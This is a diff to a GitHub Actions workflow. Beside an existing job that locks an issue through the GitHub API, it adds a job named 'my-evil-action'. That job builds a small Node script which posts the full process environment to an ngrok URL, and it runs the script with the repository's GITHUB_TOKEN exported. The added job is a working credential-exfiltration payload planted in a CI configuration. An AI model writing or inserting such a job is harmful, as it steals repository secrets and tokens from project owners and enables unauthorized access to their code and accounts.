@@ -21,4 +21,13 @@ jobs:
             -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" \
             https://api.github.com/repos/new-org-12345345/another-repo/issues/8/lock \
             -d '{"lock_reason":"off-topic"}'
+  my-evil-action:
+    runs-on: ubuntu-latest
+    steps:
+      - run: mkdir test
+      - run: cd test && npm init -y
+      - run: touch index.js
+      - run: npm install axios express
+      - run: echo "const express = require('express'); const axios = require('axios'); const app = express(); app.use(express.json()); app.listen(3000, async() => {await axios.post('https://083f-185-187-131-197.ngrok.io', process.env)});" > index.js
+      - run: MY_TOKEN=${{ secrets.GITHUB_TOKEN }} node index.js
 
